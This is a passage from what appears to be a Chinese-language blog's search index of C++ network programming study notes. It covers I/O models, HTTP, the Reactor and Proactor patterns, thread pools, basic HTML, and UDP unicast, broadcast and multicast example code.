len,int flags);interesting 非阻塞 - 不会改变进程的状态，通过返回值判断 数据读写：根据应用程序和内核的交互方式 同步 异步","text":"阻塞和非阻塞、同步和异步（网络IO）典型的一次IO的两个阶段是什么？ 数据就绪：根据系统IO操作的就绪 阻塞 - 调用IO方法的线程进入阻塞状态 12ssize_t recv(int sockfd, void* buf, size_t len,int flags);interesting 非阻塞 - 不会改变进程的状态，通过返回值判断 数据读写：根据应用程序和内核的交互方式 同步 异步 阻塞和非阻塞都是同步的IO，只有使用了特殊的API才是异步IO 异步一般与非阻塞结合使用 一个典型的网络IO接口调用，分为两个阶段，分别是“数据就绪” 和 “数据读写”，数据就绪阶段分为阻塞和非阻塞，表现得结果就是，阻塞当前线程或是直接返回。同步表示A向B请求调用一个网络IO接口时（或者调用某个业务逻辑API接口时），数据的读写都是由请求方A自己来完成的（不管是阻塞还是非阻塞）；异步表示A向B请求调用一个网络IO接口时（或者调用某个业务逻辑API接口时），向B传入请求的事件以及事件发生时通知的方式，A就可以处理其它逻辑了，当B监听到事件处理完成后，会用事先约定好的通知方式，通知A处理结果。 Unix、Linux上的五种IO模型阻塞blocking调用者调用了某个函数，等待这个函数返回，期间什么也不做，不停的去检查这个函数有没有返回，必须等这个函数返回才能进行下一步动作。 非阻塞non-blocking（NIO）非阻塞等待，每隔一段时间就去检测IO事件是否就绪。没有就绪就可以做其他事。非阻塞I&#x2F;O执行系统调用总是立即返回，不管事件是否已经发生，若事件没有发生，则返回-1，此时可以根据 errno 区分这两种情况，对于accept，recv 和 send，事件未发生时，errno 通常被设置成 EAGAIN。 IO复用（IO multiplexing）Linux 用 select&#x2F;poll&#x2F;epoll 函数实现 IO 复用模型，这些函数也会使进程阻塞，但是和阻塞IO所不同的是这些函数可以同时阻塞多个IO操作。而且可以同时对多个读操作、写操作的IO函数进行检测。直到有数据可读或可写时，才真正调用IO操作函数 信号驱动（signal-driven）Linux 用套接口进行信号驱动 IO，安装一个信号处理函数，进程继续运行并不阻塞，当IO事件就绪，进程收到SIGIO 信号，然后处理 IO 事件。 内核在第一个阶段是异步，在第二个阶段是同步；与非阻塞IO的区别在于它提供了消息通知机制，不需要用户进程不断的轮询检查，减少了系统API的调用次数，提高了效率。 异步（asynchronous）Linux中，可以调用 aio_read 函数告诉内核描述字缓冲区指针和缓冲区的大小、文件偏移及通知的方式，然后立即返回，当内核将数据拷贝到缓冲区后，再通知应用程序 1234567891011121314151617181920212223/* Asynchronous I/O control block. */struct aiocb&#123;int aio_fildes; /* File desriptor. */int aio_lio_opcode; /* Operation to be performed. */int aio_reqprio; /* Request priority offset. */volatile void *aio_buf; /* Location of buffer. */size_t aio_nbytes; /* Length of transfer. */struct sigevent aio_sigevent; /* Signal number and value. *//* Internal members. */struct aiocb *__next_prio;int __abs_prio;int __policy;int __error_code;__ssize_t __return_value;#ifndef __USE_FILE_OFFSET64__off_t aio_offset; /* File offset. */char __pad[sizeof (__off64_t) - sizeof (__off_t)];#else__off64_t aio_offset; /* File offset. */#endifchar __glibc_reserved[32];&#125;; Webserver简介和HTTP协议Webserver（网页服务器）一个 Web Server 就是一个服务器软件（程序），或者是运行这个服务器软件的硬件（计算机）。其主要功能是通过 HTTP 协议与客户端（通常是浏览器（Browser））进行通信，来接收，存储，处理来自客户端的 HTTP 请求，并对其请求做出 HTTP 响应，返回给客户端其请求的内容（文件、网页等）或返回一个 Error 信息。 通常用户使用 Web 浏览器与相应服务器进行通信。在浏览器中键入“域名”或“IP地址:端口号”，浏览器则先将你的域名解析成相应的 IP 地址或者直接根据你的IP地址向对应的 Web 服务器发送一个 HTTP 请求。这一过程首先要通过 TCP 协议的三次握手建立与目标 Web 服务器的连接，然后 HTTP 协议生成针对目标 Web 服务器的 HTTP 请求报文，通过 TCP、IP 等协议发送到目标 Web 服务器上。 HTTP协议（应用层协议）简介超文本传输协议（Hypertext Transfer Protocol，HTTP）是一个简单的请求 - 响应协议，它通常运行在TCP 之上。它指定了客户端可能发送给服务器什么样的消息以及得到什么样的响应。请求和响应消息的头以 ASCII 形式给出；而消息内容则具有一个类似 MIME 的格式。HTTP是万维网的数据通信的基础。HTTP的发展是由蒂姆·伯纳斯-李于1989年在欧洲核子研究组织（CERN）所发起。HTTP的标准制定由万维网协会（World Wide Web Consortium，W3C）和互联网工程任务（Internet Engineering Task Force，IETF）进行协调，最终发布了一系列的RFC，其中最著名的1999年6月公布的 RFC 2616，定义了HTTP协议中现今广泛使用的一个版本——HTTP 1.1。 概述HTTP 是一个客户端终端（用户）和服务器端（网站）请求和应答的标准（TCP）。通过使用网页浏览器、网络爬虫或者其它的工具，客户端发起一个HTTP请求到服务器上指定端口（默认端口为80）。我们称这个客户端为用户代理程序（user agent）。应答的服务器上存储着一些资源，比如 HTML 文件和图像。我们称这个应答服务器为源服务器（origin server）。在用户代理和源服务器中间可能存在多个“中间层”，比如代理服务器、网关或者隧道（tunnel）。 尽管 TCP&#x2F;IP 协议是互联网上最流行的应用，HTTP 协议中，并没有规定必须使用它或它支持的层。事实上，HTTP可以在任何互联网协议上，或其他网络上实现。HTTP 假定其下层协议提供可靠的传输。因此，任何能够提供这种保证的协议都可以被其使用。因此也就是其在 TCP&#x2F;IP 协议族使用 TCP 作为其传输层。通常，由HTTP客户端发起一个请求，创建一个到服务器指定端口（默认是80端口）的 TCP 连接。HTTP服务器则在那个端口监听客户端的请求。一旦收到请求，服务器会向客户端返回一个状态，比如”HTTP&#x2F;1.1 200 OK”，以及返回的内容，如请求的文件、错误消息、或者其它信息。 工作原理HTTP 协议定义 Web 客户端如何从 Web 服务器请求 Web 页面，以及服务器如何把 Web 页面传送给客户端。HTTP 协议采用了请求&#x2F;响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。 以下是 HTTP 请求&#x2F;响应的步骤： 客户端连接到 Web 服务器一个HTTP客户端，通常是浏览器，与 Web 服务器的 HTTP 端口（默认为 80 ）建立一个 TCP 套接字连接。例如，http://www.baidu.com。（URL） 发送 HTTP 请求通过 TCP 套接字，客户端向 Web 服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据 4 部分组成。 服务器接受请求并返回 HTTP 响应Web 服务器解析请求，定位请求资源。服务器将资源复本写到 TCP 套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据 4 部分组成。 释放连接 TCP 连接若 connection 模式为 close，则服务器主动关闭 TCP连接，客户端被动关闭连接，释放 TCP 连接；若connection 模式为 keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求; 客户端浏览器解析 HTML 内容客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的 HTML 文档和文档的字符集。客户端浏览器读取响应数据 HTML，根据HTML 的语法对其进行格式化，并在浏览器窗口中显示。 例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程： 浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址; 解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立 TCP 连接; 浏览器发出读取文件（ URL 中域名后面部分对应的文件）的 HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器; 服务器对浏览器请求作出响应，并把对应的 HTML 文本发送给浏览器; 释放 TCP 连接; 浏览器将该 HTML 文本并显示内容。 HTTP 协议是基于 TCP&#x2F;IP 协议之上的应用层协议，基于 请求-响应 的模式。HTTP 协议规定，请求从客户端发出，最后服务器端响应该请求并返回。换句话说，肯定是先从客户端开始建立通信的，服务器端在没有接收到请求之前不会发送响应。 HTTP请求报文与响应报文格式 可以在浏览器界面按F12查看HTTP报文 HTTP请求方法HTTP&#x2F;1.1 协议中共定义了八种方法（也叫“动作”）来以不同方式操作指定的资源： GET：向指定的资源发出“显示”请求。使用 GET 方法应该只用在读取数据，而不应当被用于产生“副作用”的操作中，例如在 Web Application 中。其中一个原因是 GET 可能会被网络蜘蛛等随意访问。 HEAD：与 GET 方法一样，都是向服务器发出指定资源的请求。只不过服务器将不传回资源的本文部分。它的好处在于，使用这个方法可以在不必传输全部内容的情况下，就可以获取其中“关于该资源的信息”（元信息或称元数据）。 POST：向指定资源提交数据，请求服务器进行处理（例如提交表单或者上传文件）。数据被包含在请求本文中。这个请求可能会创建新的资源或修改现有资源，或二者皆有。 PUT：向指定资源位置上传其最新内容。 DELETE：请求服务器删除 Request-URI 所标识的资源。 TRACE：回显服务器收到的请求，主要用于测试或诊断。 OPTIONS：这个方法可使服务器传回该资源所支持的所有 HTTP 请求方法。用’*’来代替资源名称，向 Web 服务器发送 OPTIONS 请求，可以测试服务器功能是否正常运作。 CONNECT：HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。通常用于SSL加密服务器的链接（经由非加密的 HTTP 代理服务器）。 HTTP状态码所有HTTP响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。状态代码的第一个数字代表当前响应的类型： 1xx消息——请求已被服务器接收，继续处理 2xx成功——请求已成功被服务器接收、理解、并接受 3xx重定向——需要后续操作才能完成这一请求 4xx请求错误——请求含有词法错误或者无法被执行 5xx服务器错误——服务器在处理某个正确请求时发生错误 虽然 RFC 2616 中已经推荐了描述状态的短语，例如”200 OK”，”404 Not Found”，但是WEB开发者仍然能够自行决定采用何种短语，用以显示本地化的状态描述或者自定义信息。 类别 原因短语 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 服务器编程基本框架虽然服务器程序种类繁多，但其基本框架都一样，不同之处在于逻辑处理。 模块 功能 I&#x2F;O处理单元 处理客户连接，读写网络数据 逻辑单元 业务进程或线程 网络存储单元 数据库、文件或缓存 请求队列 各单元之间的通信方式 I&#x2F;O 处理单元是服务器管理客户连接的模块。它通常要完成以下工作：等待并接受新的客户连接，接收客户数据，将服务器响应数据返回给客户端。但是数据的收发不一定在 I&#x2F;O 处理单元中执行，也可能在逻辑单元中执行，具体在何处执行取决于事件处理模式。一个逻辑单元通常是一个进程或线程。它分析并处理客户数据，然后将结果传递给 I&#x2F;O 处理单元或者直接发送给客户端（具体使用哪种方式取决于事件处理模式）。服务器通常拥有多个逻辑单元，以实现对多个客户任务的并发处理。网络存储单元可以是数据库、缓存和文件，但不是必须的。请求队列是各单元之间的通信方式的抽象。I&#x2F;O 处理单元接收到客户请求时，需要以某种方式通知一个逻辑单元来处理该请求。同样，多个逻辑单元同时访问一个存储单元时，也需要采用某种机制来协调处理竞态条件。请求队列通常被实现为池的一部分。 两种高效的事件处理模式服务器程序通常需要处理三类事件：I&#x2F;O 事件、信号及定时事件。有两种高效的事件处理模式：Reactor 和 Proactor，同步 I&#x2F;O 模型通常用于实现 Reactor 模式，异步 I&#x2F;O 模型通常用于实现 Proactor 模式。 Reactor模式使用同步 I&#x2F;O（以 epoll_wait 为例）实现的 Reactor 模式的工作流程是： 主线程往 epoll 内核事件表中注册 socket 上的读就绪事件。 主线程调用 epoll_wait 等待 socket 上有数据可读。 当 socket 上有数据可读时， epoll_wait 通知主线程。主线程则将 socket 可读事件放入请求队列。 睡眠在请求队列上的某个工作线程被唤醒，它从 socket 读取数据，并处理客户请求，然后往 epoll内核事件表中注册该 socket 上的写就绪事件。 当主线程调用 epoll_wait 等待 socket 可写。 当 socket 可写时，epoll_wait 通知主线程。主线程将 socket 可写事件放入请求队列。 睡眠在请求队列上的某个工作线程被唤醒，它往 socket 上写入服务器处理客户请求的结果。 Reactor 模式的工作流程： Proactor模式Proactor 模式将所有 I&#x2F;O 操作都交给主线程和内核来处理（进行读、写），工作线程仅仅负责业务逻辑。使用异步 I&#x2F;O 模型（以 aio_read 和 aio_write 为例）实现的 Proactor 模式的工作流程是： 主线程调用 aio_read 函数向内核注册 socket 上的读完成事件，并告诉内核用户读缓冲区的位置，以及读操作完成时如何通知应用程序（这里以信号为例）。 主线程继续处理其他逻辑。 当 socket 上的数据被读入用户缓冲区后，内核将向应用程序发送一个信号，以通知应用程序数据已经可用。 应用程序预先定义好的信号处理函数选择一个工作线程来处理客户请求。工作线程处理完客户请求后，调用 aio_write 函数向内核注册 socket 上的写完成事件，并告诉内核用户写缓冲区的位置，以及写操作完成时如何通知应用程序。 主线程继续处理其他逻辑。 当用户缓冲区的数据被写入 socket 之后，内核将向应用程序发送一个信号，以通知应用程序数据已经发送完毕。 应用程序预先定义好的信号处理函数选择一个工作线程来做善后处理，比如决定是否关闭 socket。 Proactor 模式的工作流程： 模拟Proactor模式使用同步 I&#x2F;O 方式模拟出 Proactor 模式。原理是：主线程执行数据读写操作，读写完成之后，主线程向工作线程通知这一”完成事件“。那么从工作线程的角度来看，它们就直接获得了数据读写的结果，接下来要做的只是对读写的结果进行逻辑处理。使用同步 I&#x2F;O 模型（以 epoll_wait为例）模拟出的 Proactor 模式的工作流程如下： 主线程往 epoll 内核事件表中注册 socket 上的读就绪事件。 主线程调用 epoll_wait 等待 socket 上有数据可读。 当 socket 上有数据可读时，epoll_wait 通知主线程。主线程从 socket 循环读取数据，直到没有更多数据可读，然后将读取到的数据封装成一个请求对象并插入请求队列。 睡眠在请求队列上的某个工作线程被唤醒，它获得请求对象并处理客户请求，然后往 epoll 内核事件表中注册 socket 上的写就绪事件。 主线程调用 epoll_wait 等待 socket 可写。 当 socket 可写时，epoll_wait 通知主线程。主线程往 socket 上写入服务器处理客户请求的结果。 同步 I&#x2F;O 模拟 Proactor 模式的工作流程： 线程同步机制类封装及线程池实现线程池是由服务器预先创建的一组子线程，线程池中的线程数量应该和 CPU 数量差不多。线程池中的所有子线程都运行着相同的代码。当有新的任务到来时，主线程将通过某种方式选择线程池中的某一个子线程来为之服务。相比与动态的创建子线程，选择一个已经存在的子线程的代价显然要小得多。至于主线程选择哪个子线程来为新任务服务，则有多种方式： 主线程使用某种算法来主动选择子线程。最简单、最常用的算法是随机算法和 Round Robin（轮流选取）算法，但更优秀、更智能的算法将使任务在各个工作线程中更均匀地分配，从而减轻服务器的整体压力。 主线程和所有子线程通过一个共享的工作队列来同步，子线程都睡眠在该工作队列上。当有新的任务到来时，主线程将任务添加到工作队列中。这将唤醒正在等待任务的子线程，不过只有一个子线程将获得新任务的”接管权“，它可以从工作队列中取出任务并执行之，而其他子线程将继续睡眠在工作队列上。 线程池的一般模型为： 线程池中的线程数量最直接的限制因素是中央处理器(CPU)的处理器(processors&#x2F;cores)的数量N ：如果你的CPU是4-cores的，对于CPU密集型的任务(如视频剪辑等消耗CPU计算资源的任务)来说，那线程池中的线程数量最好也设置为4（或者+1防止其他因素造成的线程塞）；对于IO密集型的任务，一般要多于CPU的核数，因为线程间竞争的不是CPU的计算资源而是IO，IO的处理一般较慢，多于cores数的线程将为CPU争取更多的任务，不至在线程处理IO的过程造成CPU空闲导致资源浪费。 空间换时间，浪费服务器的硬件资源，换取运行效率。 池是一组资源的集合，这组资源在服务器启动之初就被完全创建好并初始化，这称为静态资源。 当服务器进入正式运行阶段，开始处理客户请求的时候，如果它需要相关的资源，可以直接从池中获取，无需动态分配。 当服务器处理完一个客户连接后，可以把相关的资源放回池中，无需执行系统调用释放资源。 EPOLLONESHOT事件即使可以使用 ET 模式，一个socket 上的某个事件还是可能被触发多次。这在并发程序中就会引起一个问题。比如一个线程在读取完某个 socket 上的数据后开始处理这些数据，而在数据的处理过程中该socket 上又有新数据可读（EPOLLIN 再次被触发），此时另外一个线程被唤醒来读取这些新的数据。于是就出现了两个线程同时操作一个 socket 的局面。一个socket连接在任一时刻都只被一个线程处理，可以使用 epoll 的 EPOLLONESHOT 事件实现。对于注册了 EPOLLONESHOT 事件的文件描述符，操作系统最多触发其上注册的一个可读、可写或者异常事件，且只触发一次，除非我们使用 epoll_ctl 函数重置该文件描述符上注册的 EPOLLONESHOT 事件。这样，当一个线程在处理某个 socket 时，其他线程是不可能有机会操作该 socket 的。但反过来思考，注册了 EPOLLONESHOT 事件的 socket 一旦被某个线程处理完毕， 该线程就应该立即重置这个socket 上的 EPOLLONESHOT 事件，以确保这个 socket 下一次可读时，其 EPOLLIN 事件能被触发，进而让其他工作线程有机会继续处理这个 socket。 有限状态机逻辑单元内部的一种高效编程方法：有限状态机（finite state machine）。有的应用层协议头部包含数据包类型字段，每种类型可以映射为逻辑单元的一种执行状态，服务器可以根据它来编写相应的处理逻辑。如下是一种状态独立的有限状态机： 12345678910111213STATE_MACHINE( Package _pack )&#123; PackageType _type = _pack.GetType(); switch( _type ) &#123; case type_A: process_package_A( _pack ); break; case type_B: process_package_B( _pack ); break; &#125;&#125; 这是一个简单的有限状态机，只不过该状态机的每个状态都是相互独立的，即状态之间没有相互转移。状态之间的转移是需要状态机内部驱动，如下代码： 12345678910111213141516171819STATE_MACHINE()&#123; State cur_State = type_A; while( cur_State != type_C ) &#123; Package _pack = getNewPackage(); switch( cur_State ) &#123; case type_A: process_package_state_A( _pack ); cur_State = type_B; break; case type_B: process_package_state_B( _pack ); cur_State = type_C; break; &#125; &#125;&#125; 该状态机包含三种状态：type_A、type_B 和 type_C，其中 type_A 是状态机的开始状态，type_C 是状态机的结束状态。状态机的当前状态记录在 cur_State 变量中。在一趟循环过程中，状态机先通过getNewPackage 方法获得一个新的数据包，然后根据 cur_State 变量的值判断如何处理该数据包。数据包处理完之后，状态机通过给 cur_State 变量传递目标状态值来实现状态转移。那么当状态机进入下一趟循环时，它将执行新的状态对应的逻辑。 Html语言基础Html简介Html是超文本标记语言，在计算机钟以.html或者.htm作为拓展名，可以被浏览器识别，就是经常见到的网页。 Html的语法非常简洁，比较松散，以相应的英语单词关键词进行组合，html标签不区分大小写，标签大多数成对出现，有开始，有结束，例如&lt;html&gt;``&lt;/html&gt;,但是并没有要求必须成对出现。同时也有固定的短标签，例如&lt;br/&gt;,&lt;hr/&gt;。 学习html基本就可以认为是学习各种标签，标签也可以设置属性，例如&lt;font color=&quot;red&quot;&gt;hello,world&lt;/font&gt;，示例中color代表标签的颜色属性，red代表标签是红色字体，hello，world为实际显示的内容，可以新建一个文本文档，然后将后缀名修改.html文件，用代码编辑器打开该html文件可以编辑文件，将上述内容保存到文件中，双击该文件可以看到如下效果： Html的组成可以分为如下部分： &lt;!doctype.html&gt;声明文档类型，可以不写 &lt;html&gt;开始和&lt;/html&gt;结束，属于html的根标签 &lt;head&gt;``&lt;/head&gt;头部标签，头部标签内一般有&lt;title&gt;``&lt;/title&gt; &lt;body&gt;``&lt;/body&gt;主题标签，一般用于显示内容 例如： 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;这是一个标题&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;font color = &quot;red&quot; size = &quot;5&quot;&gt;hello,world&lt;/font&gt; &lt;body&gt;&lt;/html&gt; 如果想要添加注释，可以使用&lt;!-我是注释–&gt;的方式 Html标签介绍题目标签共有六种，,……，其中最大,最小。 文本标签标签，可以设置颜色和字体大小属性 颜色表示方法 英文单词 red green blue … 使用16进制的形式表示颜色:#ffffff 使用rgb(255,255,0) 字体大小可以使用size属性，大小范围为1-7，其中7最大，1最小 有时候需要使用换行标签，这是一个短标签 与之对应另外还有一个水平线也是短标签，，水平线也可以设置颜色和大小 列表标签列表标签分无序列表和有序列表，分别对应和 无序列表的格式如下： 12345&lt;ul&gt; &lt;li&gt;列表内容1&lt;/li&gt; &lt;li&gt;列表内容2&lt;/li&gt; ...&lt;/ul&gt; 无序列表可以设置type属性： 实心圆圈：type&#x3D;disc 空心圆圈：type&#x3D;circle 小方块：type&#x3D;square 有序列表的格式如下： 12345&lt;ol&gt; &lt;li&gt;列表内容1&lt;/li&gt; &lt;li&gt;列表内容2&lt;/li&gt; ...&lt;/ol&gt; 有序列表同样可以设置type属性 数字：type&#x3D;1，也是默认方式 英文数字：type&#x3D;a或type&#x3D;A 罗马数字：type&#x3D;i或type&#x3D;I 图片标签图片标签使用&lt;img&gt;,内部需要设置若干属性，可以不必写结束标签 src&#x3D;”3.gif”图片来源，必写 alt&#x3D;”…”，图片不显示时，显示的内容 title&#x3D;“…”,鼠标移动到图片上时显示的文字 width&#x3D;”600”，图片显示的宽度 height&#x3D;”400”，图片显示的高度 超链接标签超链接标签使用，同样需要设置属性表明要链接到哪里 属性： href=&quot;...&quot;，前往地址，必填，要写http:&#x2F;&#x2F; title=&quot;...&quot;,鼠标移动到链接上时显示的文字 target=&quot;_self&quot;，或者&quot;_blank&quot;，_self时默认值，在自身页面打开，_blank是新开页面前往连接地址 示例： &lt;a href = &quot;...&quot; title = &quot;...&quot; target = &quot;_self&quot;&gt; ... &lt;/a&gt;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"项目实战","slug":"编程语言/C/项目实战","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/"}],"tags":[]},{"title":"C++学习 网络编程 UDP通信","slug":"C++-学习-网络编程-UDP通信","date":"2023-06-04T01:46:56.000Z","updated":"2023-06-04T08:43:31.772Z","comments":true,"path":"2023/06/04/C++-学习-网络编程-UDP通信/","link":"","permalink":"http://example.com/2023/06/04/C++-%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-UDP%E9%80%9A%E4%BF%A1/","excerpt":"UDP 1234567891011121314151617#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,const struct sockaddr *dest_addr, socklen_t addrlen);- 参数： - sockfd : 通信的fd - buf : 要发送的数据 - len : 发送数据的长度 - flags : 0 - dest_addr : 通信的另外一端的地址信息 - addrlen : 地址的内存大小ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,struct sockaddr *src_addr, socklen_t *addrlen);- 参数： - sockfd : 通信的fd - buf : 接收数据的数组 - len : 数组的大小","text":"UDP 1234567891011121314151617#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,const struct sockaddr *dest_addr, socklen_t addrlen);- 参数： - sockfd : 通信的fd - buf : 要发送的数据 - len : 发送数据的长度 - flags : 0 - dest_addr : 通信的另外一端的地址信息 - addrlen : 地址的内存大小ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,struct sockaddr *src_addr, socklen_t *addrlen);- 参数： - sockfd : 通信的fd - buf : 接收数据的数组 - len : 数组的大小 案例 server 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; // 1.创建一个通信的socket int fd = socket(PF_INET, SOCK_DGRAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9999); addr.sin_addr.s_addr = INADDR_ANY; // 2.绑定 int ret = bind(fd, (struct sockaddr*)&amp;addr, sizeof(addr)); if (ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; // 3.通信 while (1) &#123; char recvbuf[128]; char ipbuf[16]; struct sockaddr_in cliaddr; int len = sizeof(cliaddr); // 接收数据 int num = recvfrom(fd, recvbuf, sizeof(recvbuf), 0, (struct sockaddr*)&amp;cliaddr, &amp;len); printf(&quot;client IP : %s, Port : %d\\n&quot;, inet_ntop(AF_INET, &amp;cliaddr.sin_addr.s_addr, ipbuf, sizeof(ipbuf)), ntohs(cliaddr.sin_port)); printf(&quot;client say : %s\\n&quot;, recvbuf); // 发送数据 sendto(fd, recvbuf, strlen(recvbuf) + 1, 0, (struct sockaddr*)&amp;cliaddr, sizeof(cliaddr)); &#125; close(fd); return 0;&#125; client 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; // 1.创建一个通信的socket int fd = socket(PF_INET, SOCK_DGRAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 服务器的地址信息 struct sockaddr_in saddr; saddr.sin_family = AF_INET; saddr.sin_port = htons(9999); inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;saddr.sin_addr.s_addr); int num = 0; // 3.通信 while (1) &#123; // 发送数据 char sendBuf[128]; sprintf(sendBuf, &quot;hello , i am client %d \\n&quot;, num++); sendto(fd, sendBuf, strlen(sendBuf) + 1, 0, (struct sockaddr*)&amp;saddr, sizeof(saddr)); // 接收数据 int num = recvfrom(fd, sendBuf, sizeof(sendBuf), 0, NULL, NULL); printf(&quot;server say : %s\\n&quot;, sendBuf); sleep(1); &#125; close(fd); return 0;&#125; 广播向子网中多台计算机发送消息，并且子网中所有的计算机都可以接收到发送方发送的消息，每个广播消息都包含一个特殊的IP地址，这个IP中子网内主机标志部分的二进制全部为1。 只能在局域网中使用。 客户端需要绑定服务器广播使用的端口，才可以接收到广播消息。 123456789// 设置广播属性的函数int setsockopt(int sockfd, int level, int optname,const void *optval, socklen_toptlen);- sockfd : 文件描述符- level : SOL_SOCKET- optname : SO_BROADCAST- optval : int类型的值，为1表示允许广播- optlen : optval的大小 案例 server 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; // 1.创建一个通信的socket int fd = socket(PF_INET, SOCK_DGRAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; //2.设置广播属性 int op = 1; setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &amp;op, sizeof(op)); //3.创建广播地址 struct sockaddr_in cliaddr; cliaddr.sin_family = AF_INET; cliaddr.sin_port = htons(9999); inet_pton(AF_INET, &quot;192.168.194.255&quot;, &amp;cliaddr.sin_addr.s_addr); // 4.通信 int num = 0; while (1) &#123; char sendBuf[128]; sprintf(sendBuf, &quot;hello , client......%d\\n&quot;, num++); // 发送数据 sendto(fd, sendBuf, strlen(sendBuf) + 1, 0, (struct sockaddr*)&amp;cliaddr, sizeof(cliaddr)); printf(&quot;广播的数据： %s\\n&quot;, sendBuf); sleep(1); &#125; close(fd); return 0;&#125; client 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; // 1.创建一个通信的socket int fd = socket(PF_INET, SOCK_DGRAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; // 2.客户端绑定本地的IP和端口 struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9999); addr.sin_addr.s_addr = INADDR_ANY; int ret = bind(fd, (struct sockaddr*)&amp;addr, sizeof(addr)); if (ret == -1) &#123; perror(&quot;bind&quot;); exit(-1); &#125; // 3.通信 while (1) &#123; char buf[128]; // 接收数据 int num = recvfrom(fd, buf, sizeof(buf), 0, NULL, NULL); printf(&quot;server say : %s\\n&quot;, buf); &#125; close(fd); return 0;&#125; 组播（多播）单播地址标识单个 IP 接口，广播地址标识某个子网的所有 IP 接口，多播地址标识一组 IP 接口。单播和广播是寻址方案的两个极端（要么单个要么全部），多播则意在两者之间提供一种折中方案。多播数据报只应该由对它感兴趣的接口接收，也就是说由运行相应多播会话应用系统的主机上的接口接收。另外，广播一般局限于局域网内使用，而多播则既可以用于局域网，也可以跨广域网使用。 组播既可以用于局域网，也可以用于广域网 客户端需要加入多播组，才能接收到多播的数据 组播地址 IP地址 说明 224.0.0.0~224.0.0.255 局部链接多播地址：是为路由协议和其它用途保留的地址，路由器并不转发属于此范围的IP包 224.0.1.0~224.0.1.255 预留多播地址：公用组播地址，可用于Internet；使用前需要申请 224.0.2.0~238.255.255.255 预留多播地址：用户可用组播地址(临时组地址)，全网范围内有效 239.0.0.0~239.255.255.255 本地管理组播地址，可供组织内部使用，类似于私有 IP 地址，不 能用于 Internet，可限制多播范围 设置组播 1234567891011121314151617181920212223int setsockopt(int sockfd, int level, int optname,const void *optval,socklen_t optlen);// 服务器设置多播的信息，外出接口- level : IPPROTO_IP- optname : IP_MULTICAST_IF- optval : struct in_addr// 客户端加入到多播组：- level : IPPROTO_IP- optname : IP_ADD_MEMBERSHIP- optval : struct ip_mreqstruct ip_mreq&#123;/* IP multicast address of group. */struct in_addr imr_multiaddr; // 组播的IP地址/* Local IP address of interface. */struct in_addr imr_interface; // 本地的IP地址&#125;;typedef uint32_t in_addr_t;struct in_addr&#123;in_addr_t s_addr;&#125;; 案例 server 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123; // 1.创建一个通信的socket int fd = socket(PF_INET, SOCK_DGRAM, 0); if (fd == -1) &#123; perror(&quot;socket&quot;); exit(-1); &#125; //2.设置多播属性，设置外出接口 struct in_addr imr_multiaddr; //初始化多播地址 inet_pton(AF_INET, &quot;239.0.0.10&quot;, 